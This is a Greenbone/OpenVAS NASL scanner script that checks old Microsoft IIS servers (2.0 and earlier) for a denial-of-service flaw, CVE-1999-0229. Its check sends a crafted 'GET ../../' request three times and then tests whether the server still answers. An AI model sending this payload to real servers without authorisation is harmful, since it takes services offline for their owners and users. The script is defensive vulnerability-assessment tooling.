# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902914");
  script_version("2025-03-11T05:38:16+0000");
  script_cve_id("CVE-1999-0229");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-03-11 05:38:16 +0000 (Tue, 11 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-05-22 12:45:33 +0530 (Tue, 22 May 2012)");
  script_name("Microsoft IIS <= 2.0 GET Request DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/1638");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2218");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/246425.php");
  script_xref(name:"URL", value:"http://www.iss.net/security_center/reference/vuln/HTTP_DotDot.htm");

  script_tag(name:"summary", value:"Microsoft IIS Webserver is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the service is
  still responding.");

  script_tag(name:"insight", value:"The flaw is due to an error in the handling of HTTP GET requests
  that contain a tunable number of '../' sequences in the URL.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to force the IIS server to become unresponsive until the IIS service is restarted
  manually by the administrator.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services (IIS) 2.0 and prior on
  Microsoft Windows NT.");

  script_tag(name:"solution", value:"Upgrade to latest version of IIS and latest Microsoft Service
  Packs.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

# nb:
# - http_is_dead() used below might fork on multiple hostnames and should be always before the first
#   http_send_recv() call
# - For simplicity within such an older check we're just calling http_host_name() instead directly
#   here as it will also fork
http_host_name(port:port);

for(i = 0; i < 3; i++)
  res = http_send_recv(port:port, data:'GET ../../\r\n');

sleep(3);

if(http_is_dead(port:port) && !res) {
  security_message(port:port);
  exit(0);
}

exit(99);
